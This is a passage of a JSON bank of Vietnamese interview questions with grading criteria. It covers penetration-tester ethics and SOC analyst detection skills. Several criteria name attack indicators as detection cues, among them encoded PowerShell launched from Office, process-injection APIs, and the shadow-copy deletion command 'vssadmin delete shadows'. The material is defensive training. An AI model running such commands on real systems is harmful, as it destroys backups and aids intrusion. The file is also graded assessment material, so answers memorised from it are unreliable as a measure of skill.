        "question": "CV của em có nhắc đến việc tham gia các chương trình Săn lỗi nhận thưởng (Bug Bounty) hoặc phát hiện lỗ hổng có mã định danh CVE/Hall of Fame. Hãy trình bày một lỗ hổng bảo mật độc đáo mà em tự hào nhất, quy trình báo cáo có trách nhiệm (Responsible Disclosure) và phản hồi từ phía tổ chức quản lý?",
        "evaluationCriteria": [
          "Trình bày chi tiết lỗ hổng logic nghiệp vụ độc đáo mà các công cụ quét tự động hoàn toàn bỏ sót",
          "Quy trình báo cáo bảo mật có trách nhiệm: liên hệ đúng kênh Security.txt hoặc nền tảng HackerOne/Bugcrowd, cung cấp hướng dẫn PoC rõ ràng và tôn trọng thời hạn khắc phục 90 ngày trước khi công bố",
          "Thái độ chuyên nghiệp, bảo mật thông tin và tôn trọng quy định bảo mật của chương trình"
        ],
        "followUps": [
          "Bài học rút ra về sự khác biệt giữa tư duy kiểm thử có khung giờ cố định và tư duy săn lỗi tự do trong Bug Bounty?",
          "Làm thế nào để duy trì đạo đức nghề nghiệp và không bị cám dỗ bán lỗ hổng ra thị trường chợ đen?"
        ],
        "tags": [
          "Bug Bounty",
          "Responsible Disclosure",
          "Business Logic Flaw",
          "Security Ethics",
          "CVE Discovery"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Khoe khoang việc khai thác phá hoại hoặc tống tiền doanh nghiệp sau khi tìm thấy lỗ hổng"
        ]
      },
      {
        "id": "PENTEST-BEHAV-01",
        "role": "Penetration Tester (PenTest)",
        "category": "behavioral",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "Khi đội ngũ lập trình viên phản ứng gay gắt trước báo cáo lỗ hổng của em và cho rằng: 'Đây chỉ là lỗi lý thuyết trong phòng lab, ngoài đời người dùng bình thường không bao giờ làm như vậy nên chúng tôi không rảnh để sửa', em giải thích và thuyết phục họ ra sao?",
        "evaluationCriteria": [
          "Giữ thái độ điềm tĩnh, chuyên nghiệp; không tranh cãi bằng cái tôi cá nhân",
          "Giải thích rõ ràng: Tin tặc không phải là 'người dùng bình thường'; chúng sử dụng các công cụ tự động để dò tìm chính xác những kịch bản phi chuẩn mực này",
          "Thực hiện một buổi diễn tập trực tiếp (Live Demo PoC): trình diễn một kịch bản tấn công thực tế và chỉ ra hậu quả cụ thể đến dữ liệu khách hàng; sau đó nhiệt tình hướng dẫn họ các phương án sửa code đơn giản, ít tốn công nhất"
        ],
        "followUps": [
          "Làm thế nào để xây dựng mối quan hệ đối tác tin cậy với đội ngũ Dev thay vì bị xem là 'kẻ chuyên bới lông tìm vết'?",
          "Khi một tranh chấp về mức độ rủi ro (Severity Rating) không thể giải quyết, em điều phối thống nhất theo khung CVSS khách quan ra sao?"
        ],
        "tags": [
          "Overcoming Developer Skepticism",
          "Live PoC Demonstration",
          "Empathy with Devs",
          "CVSS Objectivity"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Cười nhạo trình độ của lập trình viên hoặc dọa dẫm báo cáo lên ban giám đốc để ép họ phải sửa"
        ]
      },
      {
        "id": "PENTEST-BEHAV-02",
        "role": "Penetration Tester (PenTest)",
        "category": "behavioral",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Trong quá trình kiểm thử một ứng dụng web, em tình cờ phát hiện ra một lỗ hổng cực kỳ nghiêm trọng trên một máy chủ của một đơn vị bên thứ ba (Third-party vendor) hoàn toàn nằm ngoài phạm vi thỏa thuận kiểm thử (Out of Scope). Em xử lý tình huống đạo đức và pháp lý nhạy cảm này như thế nào?",
        "evaluationCriteria": [
          "Dừng ngay lập tức mọi hoạt động khai thác sâu hơn vào máy chủ ngoài phạm vi đó để tuân thủ tuyệt đối quy định pháp luật",
          "Ghi nhận hiện tượng một cách cẩn trọng và thông báo ngay lập tức cho Khách hàng chủ quản: giải thích mối đe dọa liên đới tiềm tàng từ đối tác thứ ba đó đến an ninh chung của khách hàng",
          "Hướng dẫn khách hàng kích hoạt kênh liên hệ bảo mật chính thức với đối tác thứ ba để phối hợp xử lý theo quy trình công bố có trách nhiệm"
        ],
        "followUps": [
          "Tại sao việc tự ý tấn công một hệ thống nằm ngoài phạm vi RoE - dù với mục đích tốt - vẫn cấu thành hành vi vi phạm pháp luật hình sự?",
          "Cách ghi nhận phát hiện ngoài phạm vi (Out-of-Scope finding) vào phụ lục báo cáo một cách an toàn về mặt pháp lý?"
        ],
        "tags": [
          "Out of Scope Discovery",
          "Legal Boundaries",
          "Third-party Risk",
          "Ethical Responsibility"
        ],
        "sourceRefs": [
          "https://csrc.nist.gov/publications/detail/sp/800-115/final",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Tiếp tục tấn công khai thác máy chủ bên thứ ba với lý do 'tiện thể kiểm tra giúp họ'"
        ]
      },
      {
        "id": "PENTEST-BEHAV-03",
        "role": "Penetration Tester (PenTest)",
        "category": "behavioral",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Sau 4 ngày kiểm thử một ứng dụng được lập trình rất cẩn thận, em hoàn toàn không tìm thấy bất kỳ lỗ hổng mức độ Cao hay Nghiêm trọng nào. Áp lực vô hình khiến em cảm thấy như mình 'chưa hoàn thành nhiệm vụ' hoặc sợ khách hàng đánh giá năng lực kém. Em quản lý tâm lý bản thân và lập báo cáo ra sao?",
        "evaluationCriteria": [
          "Thẳng thắn nhìn nhận: Mục tiêu của Pentest là đánh giá trung thực hiện trạng an ninh của hệ thống, không phải là 'cố tình bới móc' để làm đẹp số lượng lỗi",
          "Không cố tình phóng đại các lỗi nhỏ nhặt hoặc cấu hình lỏng lẻo thông thường thành lỗi nghiêm trọng để đối phó",
          "Tập trung phân tích sâu vào các biện pháp phòng thủ tốt mà khách hàng đã triển khai (Positive Findings), đồng thời chỉ ra các điểm có thể củng cố thêm (Hardening Recommendations) để nâng cao độ bền vững"
        ],
        "followUps": [
          "Làm thế nào để chứng minh cho khách hàng thấy giá trị của một cuộc kiểm thử ngay cả khi không có lỗ hổng nghiêm trọng nào được phát hiện?",
          "Cách rà soát lại phương pháp luận của bản thân để đảm bảo mình không bị bỏ sót góc khuất nào trước khi kết luận?"
        ],
        "tags": [
          "Integrity in Reporting",
          "Zero Finding Dilemma",
          "Positive Observations",
          "Professional Honesty"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Thổi phồng các cảnh báo vô hại thành lỗ hổng Critical để làm báo cáo trông có vẻ hoành tráng"
        ]
      },
      {
        "id": "PENTEST-BEHAV-04",
        "role": "Penetration Tester (PenTest)",
        "category": "behavioral",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Khách hàng yêu cầu em thực hiện kiểm thử xâm nhập trực tiếp trên môi trường Production đang phục vụ hàng triệu người dùng thật trong giờ cao điểm vì họ không có môi trường Staging tương đương. Em phân tích rủi ro và thương lượng các biện pháp an toàn ra sao?",
        "evaluationCriteria": [
          "Cảnh báo rõ ràng cho khách hàng về rủi ro gián đoạn dịch vụ, hỏng cơ sở dữ liệu và ảnh hưởng đến giao dịch của người dùng thật",
          "Đàm phán chuyển khung giờ kiểm thử sang giờ thấp điểm ban đêm (Maintenance Window: 1h - 4h sáng) có sự túc trực sẵn sàng của đội ngũ kỹ sư vận hành hệ thống",
          "Loại bỏ hoàn toàn các bài kiểm tra có nguy cơ gây mất ổn định (như DoS, brute-force tải lớn, lệnh ghi/xóa dữ liệu hàng loạt) và chỉ thực hiện các payload kiểm tra logic an toàn"
        ],
        "followUps": [
          "Những điều khoản bắt buộc phải bổ sung vào Hợp đồng / RoE khi kiểm thử trên môi trường Production là gì?",
          "Quy trình kích hoạt nút dừng khẩn cấp (Emergency Abort Button) khi hệ thống có dấu hiệu quá tải?"
        ],
        "tags": [
          "Production Pentest Risks",
          "Maintenance Window",
          "Safe Testing Scope",
          "Contractual Safeguards"
        ],
        "sourceRefs": [
          "https://csrc.nist.gov/publications/detail/sp/800-115/final",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Vô tư chạy các công cụ quét tự động với tốc độ tối đa trên Production vào giờ cao điểm của khách hàng"
        ]
      },
      {
        "id": "PENTEST-BEHAV-05",
        "role": "Penetration Tester (PenTest)",
        "category": "behavioral",
        "difficulty": "intermediate",
        "seniority": "senior_lead",
        "question": "Một người bạn thân ngoài công việc ngỏ ý nhờ em 'thử hack vào tài khoản mạng xã hội của người yêu họ' hoặc 'kiểm tra giùm website của công ty đối thủ xem có lỗ hổng không'. Em từ chối và giải thích về ranh giới đạo đức nghề nghiệp của một Chuyên gia An ninh mạng ra sao?",
        "evaluationCriteria": [
          "Kiên quyết từ chối ngay lập tức, không có bất kỳ ngoại lệ nào; giữ vững lập trường đạo đức và pháp luật",
          "Giải thích rõ ràng và nghiêm túc: Mọi hành vi tấn công mạng không có sự ủy quyền chính thức bằng văn bản đều là hành vi phạm tội hình sự và vi phạm nghiêm trọng lời thề đạo đức nghề nghiệp",
          "Tư vấn cho bạn các giải pháp lành mạnh, hợp pháp để giải quyết vấn đề cá nhân hoặc hướng dẫn công ty đối thủ tự thuê dịch vụ bảo mật chính thống"
        ],
        "followUps": [
          "Làm thế nào để một Chuyên gia An ninh mạng luôn giữ được 'Tâm sáng' khi nắm trong tay những công cụ và kỹ năng có sức công phá nguy hiểm?",
          "Trách nhiệm của một Senior Pentester trong việc định hướng đạo đức cho các bạn trẻ mới vào ngành?"
        ],
        "tags": [
          "Professional Ethics",
          "Legal Integrity",
          "Firm Refusal",
          "White-hat Principles"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Nhận lời tấn công trái phép cho bạn bè, xem nhẹ trách nhiệm pháp lý và ranh giới đạo đức của ngành an ninh thông tin"
        ]
      }
    ]
  },
  {
    "role": "SOC Analyst (L1/L2/L3)",
    "group": "cybersecurity",
    "groupLabel": "An toàn thông tin (Cybersecurity)",
    "aliases": [
      "soc analyst",
      "soc analyst l1",
      "soc analyst l2",
      "soc analyst l3",
      "soc analyst (l1/l2/l3)",
      "security operations center analyst",
      "chuyen vien soc",
      "giam sat an ninh mang"
    ],
    "questions": [
      {
        "id": "SOC-FOUND-01",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "foundation",
        "difficulty": "basic",
        "seniority": "fresher_intern",
        "question": "Trong SOC Analyst (L1/L2/L3), phân biệt SOC Tiers, Alert Triage, MTTD, MTTR; mô tả khi nào em áp dụng chúng trong bài tập.",
        "evaluationCriteria": [
          "Giải thích đúng ý nghĩa cơ bản của SOC Tiers.",
          "Phân biệt được các khái niệm liên quan Alert Triage, MTTD, MTTR ở mức nhập môn.",
          "Đưa ra được ví dụ học tập phù hợp với vị trí SOC Analyst (L1/L2/L3)."
        ],
        "followUps": [
          "Nếu mới học SOC Tiers, em sẽ dùng ví dụ đơn giản nào để tự kiểm tra mình đã hiểu?"
        ],
        "tags": [
          "SOC Tiers",
          "Alert Triage",
          "MTTD",
          "MTTR",
          "Shift Handover",
          "SLA"
        ],
        "sourceRefs": [
          "https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Nhầm lẫn khái niệm nền tảng hoặc không thể đưa ra ví dụ cơ bản."
        ]
      },
      {
        "id": "SOC-FOUND-02",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "foundation",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Nguyên lý vận hành của hệ thống SIEM (Splunk / Microsoft Sentinel / IBM QRadar): Quá trình thu thập log (Log Ingestion), chuẩn hóa (Normalization - CEF/Syslog), đánh chỉ mục (Indexing) và luật tương quan (Correlation Rules) giúp phát hiện hành vi bất thường như thế nào?",
        "evaluationCriteria": [
          "Log Ingestion qua Syslog, API, Agent (Splunk Universal Forwarder, Logstash, Winlogbeat)",
          "Normalization đưa các định dạng log khác nhau về schema thống nhất (như CIM trong Splunk, ASIM trong Sentinel)",
          "Correlation Rules: Kết hợp nhiều sự kiện riêng lẻ (vd: 5 lần đăng nhập SSH thất bại sau đó 1 lần thành công, theo sau là lệnh `sudo su` trong vòng 2 phút) để kích hoạt cảnh báo duy nhất có độ tin cậy cao"
        ],
        "followUps": [
          "Sự khác biệt giữa truy vấn SPL (Splunk) và KQL (Kusto Query Language trong Sentinel)?",
          "Tại sao việc thiếu đồng bộ thời gian (NTP out of sync) giữa các nguồn log có thể phá hỏng hoàn toàn correlation rules?"
        ],
        "tags": [
          "SIEM",
          "Log Correlation",
          "CEF",
          "Splunk",
          "Microsoft Sentinel",
          "Log Ingestion"
        ],
        "sourceRefs": [
          "https://docs.splunk.com/Documentation",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Xem SIEM đơn thuần là kho lưu trữ log mà không hiểu bản chất của luật tương quan phân tích sự kiện"
        ]
      },
      {
        "id": "SOC-FOUND-03",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "foundation",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Phân tích cơ chế giám sát EDR (Endpoint Detection and Response - CrowdStrike Falcon / Microsoft Defender for Endpoint): EDR thu thập những dữ liệu telemetry nào (Process tree, Parent-Child Process, DLL injection, Registry run keys) và phát hiện hành vi tấn công không dùng file (Fileless Malware) ra sao?",
        "evaluationCriteria": [
          "EDR cài sensor ở kernel/user space ghi nhận liên tục: tạo process, load thư viện, kết nối mạng, sửa registry, can thiệp memory",
          "Phát hiện quan hệ bất thường: Microsoft Word hoặc Excel kích hoạt `powershell.exe` hoặc `cmd.exe` với cờ ẩn (`-EncodedCommand`, `-WindowStyle Hidden`)",
          "Phát hiện Fileless: Quét PowerShell script block logging (Event ID 4104), phân tích hành vi nạp shellcode trực tiếp vào RAM bằng API hook (`VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`)"
        ],
        "followUps": [
          "Parent PID (PPID) Spoofing là kỹ thuật gì và EDR làm sao phát hiện được kỹ thuật này?",
          "Khác biệt bản chất giữa Antivirus truyền thống (AV) và EDR hiện đại?"
        ],
        "tags": [
          "EDR",
          "Telemetry",
          "Parent-Child Process",
          "Fileless Malware",
          "Memory Injection",
          "CrowdStrike"
        ],
        "sourceRefs": [
          "https://attack.mitre.org/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Nghĩ rằng mã độc không tạo file trên đĩa cứng thì EDR hoàn toàn bất lực"
        ]
      },
      {
        "id": "SOC-FOUND-04",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "foundation",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Các nguồn Windows Event Log cốt lõi mà một SOC Analyst bắt buộc phải nắm vững: Ý nghĩa phân tích của Event ID 4624 (Logon thành công & các Logon Type 2, 3, 10), 4625 (Logon thất bại), 4672 (Đặc quyền gán), 4720 (Tạo tài khoản mới) và Sysmon Event ID 1, 3, 7, 8?",
        "evaluationCriteria": [
          "Logon Type 2: Đăng nhập trực tiếp tại bàn phím/console; Logon Type 3: Đăng nhập qua mạng (Network share, SMB); Logon Type 10: Remote Desktop (RDP)",
          "4625 hàng loạt từ một IP nội bộ chỉ dấu tấn công Brute-force hoặc Password Spraying; 4672 báo hiệu tài khoản vừa nhận quyền quản trị cao cấp (Administrator privilege assign)",
          "Sysmon: ID 1 (Process creation kèm command-line, hash, parent process), ID 3 (Network connection từ process cụ thể), ID 7 (Image loaded / DLL hijack), ID 8 (CreateRemoteThread)"
        ],
        "followUps": [
          "Làm thế nào để nhận diện một phiên đăng nhập RDP thành công bất thường ngoài giờ làm việc bằng Event ID 4624 type 10?",
          "Tại sao Sysmon lại cung cấp độ phủ giám sát sâu hơn nhiều so với Windows Security log mặc định?"
        ],
        "tags": [
          "Windows Event Log",
          "Sysmon",
          "Logon Types",
          "Event ID 4624",
          "Event ID 4625",
          "Event ID 1"
        ],
        "sourceRefs": [
          "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Không nắm được các Logon Type cơ bản (nhầm lẫn giữa Interactive Logon và Network Logon)"
        ]
      },
      {
        "id": "SOC-FOUND-05",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "foundation",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Kim tự tháp Nỗi đau (Pyramid of Pain) của David Bianco và Mô hình MITRE ATT&CK: Cách SOC Analyst phân loại và áp dụng các Chỉ số xâm phạm (IoC) từ tầng Hash, IP, Domain đến TTPs (Tactics, Techniques, and Procedures)?",
        "evaluationCriteria": [
          "Kim tự tháp từ đáy lên đỉnh: Hash (Trivial - dễ thay đổi chỉ bằng 1 byte) -> IP Addresses (Easy) -> Domain Names (Simple) -> Network/Host Artifacts (Annoying) -> Tools (Challenging) -> TTPs (Tough - khiến kẻ tấn công đau đớn nhất)",
          "Đối phó ở tầng IP/Hash chỉ giải quyết bề nổi vì tin tặc đổi IP/C2 chỉ mất vài giây",
          "Mapping alert theo MITRE ATT&CK Tactic (Initial Access, Execution, Persistence, Privilege Escalation...) giúp nhìn thấy bức tranh toàn cảnh của chiến dịch tấn công"
        ],
        "followUps": [
          "Tại sao việc xây dựng rule phát hiện dựa trên TTPs lại bền vững hơn nhiều so với việc chỉ blacklist danh sách IP/Hash?",
          "Cho ví dụ về một luật phát hiện ở tầng Host Artifacts hoặc Tools?"
        ],
        "tags": [
          "Pyramid of Pain",
          "MITRE ATT&CK",
          "IoC",
          "TTPs",
          "David Bianco",
          "Threat Detection"
        ],
        "sourceRefs": [
          "https://attack.mitre.org/",
          "https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html"
        ],
        "redFlags": [
          "Cho rằng chặn một danh sách địa chỉ IP tĩnh là đã giải quyết triệt để mối đe dọa dai dẳng"
        ]
      },
      {
        "id": "SOC-FOUND-06",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "foundation",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "Khái niệm Cảnh báo mỏi mệt (Alert Fatigue) và Tỷ lệ báo động giả (False Positive Rate): Tác động tiêu cực của Alert Fatigue đến tâm lý SOC Analyst và phương pháp khoa học để tinh chỉnh (Tuning) quy tắc giám sát trong SIEM/SOAR?",
        "evaluationCriteria": [
          "Alert Fatigue xảy ra khi SOC nhận hàng ngàn cảnh báo nhiễu mỗi ngày, dẫn đến kiệt sức, mất tập trung và dễ bỏ lọt cảnh báo thực sự nguy hiểm (True Positive)",
          "Tuning: Phân tích tần suất cảnh báo định kỳ, loại trừ các luồng công việc hợp lệ đã biết (Whitelisting backup job, vulnerability scanner IP)",
          "Sử dụng SOAR (Security Orchestration, Automation and Response) để tự động hóa kiểm tra sơ bộ (enrichment: check VirusTotal, IP reputation, query AD) trước khi đẩy sang con người duyệt"
        ],
        "followUps": [
          "Quy trình đo lường tỷ lệ False Positive / True Positive hàng tháng trong SOC?",
          "Khi nào nên tạm vô hiệu hóa một correlation rule gây bão cảnh báo (Alert Storm)?"
        ],
        "tags": [
          "Alert Fatigue",
          "False Positive Tuning",
          "SOAR Automation",
          "Alert Storm",
          "SOC Efficiency"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Xem việc nhận 5000 cảnh báo mỗi ngày là điều hiển nhiên và giải quyết bằng cách bấm 'Close' hàng loạt không điều tra"
        ]
      },
      {
        "id": "SOC-PRAC-01",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "practical_skills",
        "difficulty": "basic",
        "seniority": "fresher_intern",
        "question": "Mô phỏng Phishing Triage (Email Headers, SPF DKIM DMARC, Sandbox Analysis, Any.Run) cho SOC Analyst (L1/L2/L3): em chuẩn bị gì, thao tác nào và đo kết quả ra sao?",
        "evaluationCriteria": [
          "Nêu mục đích sử dụng Phishing Triage trong một bài tập hoặc dự án nhỏ.",
          "Trình bày được các bước thực hiện theo thứ tự và phù hợp với Intern/Fresher.",
          "Đề xuất được cách kiểm tra kết quả và biết khi nào cần tra cứu hoặc hỏi người hướng dẫn."
        ],
        "followUps": [
          "Nếu kết quả chưa đúng, em sẽ kiểm tra bước nào đầu tiên và dựa vào dấu hiệu gì?"
        ],
        "tags": [
          "Phishing Triage",
          "Email Headers",
          "SPF DKIM DMARC",
          "Sandbox Analysis",
          "Any.Run",
          "VirusTotal"
        ],
        "sourceRefs": [
          "https://www.cisa.gov/resources-tools/resources/preventing-phishing-attacks",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Không xác định được mục tiêu thực hành hoặc nêu cách kiểm tra kết quả không phù hợp."
        ]
      },
      {
        "id": "SOC-PRAC-02",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "practical_skills",
        "difficulty": "intermediate",
        "seniority": "fresher_intern",
        "question": "Bài tập SOC Analyst (L1/L2/L3): dựa trên Password Spraying, phối hợp Azure AD Sign-in Logs, Active Directory, Impossible Travel, Identity Protection; đầu ra sẽ được kiểm tra bằng tiêu chí nào?",
        "evaluationCriteria": [
          "Nêu mục đích sử dụng Password Spraying trong một bài tập hoặc dự án nhỏ.",
          "Trình bày được các bước thực hiện theo thứ tự và phù hợp với Intern/Fresher.",
          "Đề xuất được cách kiểm tra kết quả và biết khi nào cần tra cứu hoặc hỏi người hướng dẫn."
        ],
        "followUps": [
          "Nếu kết quả chưa đúng, em sẽ kiểm tra bước nào đầu tiên và dựa vào dấu hiệu gì?"
        ],
        "tags": [
          "Password Spraying",
          "Azure AD Sign-in Logs",
          "Active Directory",
          "Impossible Travel",
          "Identity Protection"
        ],
        "sourceRefs": [
          "https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-sign-ins",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Không xác định được mục tiêu thực hành hoặc nêu cách kiểm tra kết quả không phù hợp."
        ]
      },
      {
        "id": "SOC-PRAC-03",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Phân tích lưu lượng mạng bằng Wireshark và Network Security Monitoring (Zeek/Suricata): Làm thế nào để phát hiện dấu hiệu C2 Beaconing (kết nối ngầm theo chu kỳ), DNS Tunneling hoặc truyền tải dữ liệu dung lượng lớn bất thường (Data Exfiltration)?",
        "evaluationCriteria": [
          "C2 Beaconing: Phân tích khoảng thời gian giữa các gói tin (Delta time / Jitter); Zeek connection log (`conn.log`) cho thấy các kết nối ra ngoài định kỳ cố định (vd: đúng mỗi 60 giây) tới IP không tên tuổi",
          "DNS Tunneling: Kiểm tra lưu lượng DNS query bất thường, số lượng truy vấn subdomain độ dài cao, mã hóa base32/base64 (vd: `a8f3b...company.xyz`), tỷ lệ query TXT record cao bất thường",
          "Data Exfiltration: Thống kê Bytes Out vượt trội so với Bytes In trên các cổng không phổ biến hoặc giao thức HTTPS kéo dài liên tục"
        ],
        "followUps": [
          "Làm thế nào để viết luật Suricata (Suricata Rule) cơ bản phát hiện một User-Agent độc hại đã biết?",
          "Cách sử dụng công cụ RITA (Real Intelligence Threat Analytics) để phát hiện beaconing từ log Zeek?"
        ],
        "tags": [
          "Wireshark",
          "Zeek",
          "Suricata",
          "C2 Beaconing",
          "DNS Tunneling",
          "Data Exfiltration"
        ],
        "sourceRefs": [
          "https://zeek.org/documentation/",
          "https://attack.mitre.org/"
        ],
        "redFlags": [
          "Không phân tích cấu trúc gói tin DNS, bỏ qua các truy vấn có subdomain dài bất thường"
        ]
      },
      {
        "id": "SOC-PRAC-04",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Sử dụng công cụ EDR để điều tra và cô lập máy trạm bị nhiễm Ransomware (Endpoint Isolation & Live Response): Các lệnh truy vấn PowerShell/CLI khẩn cấp để truy vết Process ID, Network Socket đang mở, và Kill tiến trình độc hại?",
        "evaluationCriteria": [
          "Thực hiện chức năng Host Isolation trên console EDR ngay lập tức (vẫn giữ kênh liên lạc EDR quản trị nhưng cắt toàn bộ kết nối mạng khác của máy trạm)",
          "Mở Live Response: Dùng lệnh `tasklist /v`, `Get-Process`, kiểm tra CommandLine của process đáng ngờ đang mã hóa file hoặc chạy `vssadmin delete shadows`",
          "Dùng `netstat -ano` hoặc `Get-NetTCPConnection` để định danh remote IP/Port đang kết nối; Kill tiến trình (`Stop-Process -Force`) và thu thập file mẫu (Dump process memory / Quarantine executable)"
        ],
        "followUps": [
          "Tại sao việc 'Tắt phụt nguồn máy' (Pull the plug / Hard shutdown) là sai lầm nghiêm trọng khi máy đang bị nhiễm Ransomware có EDR?",
          "Cách kiểm tra các khóa Persistence trong Registry (`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`) bằng CLI?"
        ],
        "tags": [
          "Host Isolation",
          "EDR Live Response",
          "Process Investigation",
          "PowerShell Forensics",
          "Ransomware Triage"
        ],
        "sourceRefs": [
          "https://www.cisa.gov/news-events/cybersecurity-advisories",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Vội vàng tắt nguồn máy tính làm mất sạch dữ liệu trong bộ nhớ RAM và khóa giải mã tiềm năng"
        ]
      },
      {
        "id": "SOC-PRAC-05",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Detection Engineering: Xây dựng và kiểm thử luật phát hiện đe dọa (Threat Detection Rules) bằng chuẩn định dạng Sigma Rule hoặc YARA-L trong Google Chronicle/SIEM hiện đại?",
        "evaluationCriteria": [
          "Sigma Rule: Định dạng YAML trung lập giúp viết luật một lần và chuyển đổi (sigmac/pySigma) sang Splunk SPL, Sentinel KQL, QRadar AQL, Elastic Lucene",
          "Cấu trúc Sigma: `title`, `status`, `logsource` (category, product), `detection` (selection, filter, condition: `selection and not filter`)",
          "Quy trình kiểm thử: Giả lập kỹ thuật tấn công bằng Atomic Red Team trong môi trường lab, kiểm tra log sinh ra, đối chiếu rule có trigger đúng không và đo lường tỷ lệ false positive"
        ],
        "followUps": [
          "Làm thế nào để quản lý vòng đời và phiên bản của tập luật Sigma bằng Git (Detection-as-Code)?",
          "Sự khác biệt giữa YARA (quét file/memory) và YARA-L (ngôn ngữ truy vấn tương quan sự kiện log)?"
        ],
        "tags": [
          "Sigma Rules",
          "Detection Engineering",
          "Atomic Red Team",
          "Detection-as-Code",
          "YARA-L"
        ],
        "sourceRefs": [
          "https://github.com/SigmaHQ/sigma",
          "https://attack.mitre.org/"
        ],
        "redFlags": [
          "Viết rule quá rộng (vd: báo động mỗi khi ai đó chạy powershell.exe) khiến hệ thống ngập lụt hàng chục nghìn false alerts"
        ]
      },
      {
        "id": "SOC-PRAC-06",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "practical_skills",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "Tự động hóa vận hành SOC bằng SOAR Playbook (Security Orchestration, Automation, and Response): Cách thiết kế một kịch bản phản ứng tự động (Automated Playbook) cho cảnh báo 'Nhiều lần đăng nhập thất bại sau đó thành công ngoài giờ làm việc'?",
        "evaluationCriteria": [
          "Trigger: Cảnh báo từ SIEM được đẩy sang SOAR platform qua webhook/API",
          "Enrichment step: Tự động truy vấn IP reputation (AbuseIPDB, VirusTotal), truy vấn thông tin nhân sự từ Okta/HR system (vị trí, phòng ban, quản lý trực tiếp)",
          "Decision branch: Nếu IP thuộc VPN công ty hoặc IP nhà riêng đã khai báo -> hạ mức độ nghiêm trọng; Nếu IP từ quốc gia lạ có rủi ro cao -> Tự động gửi tin nhắn Slack/Teams xác nhận với nhân viên (2FA challenge) hoặc tạm khóa phiên (Revoke session token) và báo SOC L2"
        ],
        "followUps": [
          "Lợi ích và rủi ro lớn nhất khi cho phép SOAR tự động khóa tài khoản (Automated Remediation) mà không cần con người duyệt?",
          "Các chỉ số hiệu quả (Metrics) chính để chứng minh ROI khi triển khai giải pháp SOAR?"
        ],
        "tags": [
          "SOAR Playbooks",
          "Automated Remediation",
          "Enrichment",
          "Workflow Automation",
          "AbuseIPDB"
        ],
        "sourceRefs": [
          "https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Thiết kế playbook tự động thực hiện các hành động phá hủy dữ liệu hoặc gián đoạn dịch vụ sản xuất mà không có cơ chế Human-in-the-loop"
        ]
      },
      {
        "id": "SOC-PRAC-07",
        "role": "SOC Analyst (L1/L2/L3)",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Phân tích hành vi di chuyển ngang (Lateral Movement Detection) trong mạng nội bộ Windows Domain: Cách nhận diện tấn công Pass-the-Hash, PsExec và WMI/WinRM remote execution qua log?",
        "evaluationCriteria": [
          "Pass-the-Hash: Kẻ tấn công dùng NTLM hash thay vì plaintext password; Log Event ID 4624 với Logon Process `NtLmSsp`, Package Name NTLM V1/V2, Key Length 0",
          "PsExec: Tạo dịch vụ từ xa (Event ID 7045 - Service Creation, thường có tên ngẫu nhiên hoặc `PSEXESVC`), truy cập share admin ẩn `ADMIN$` hoặc `IPC$` (Event ID 5140, 5145)",
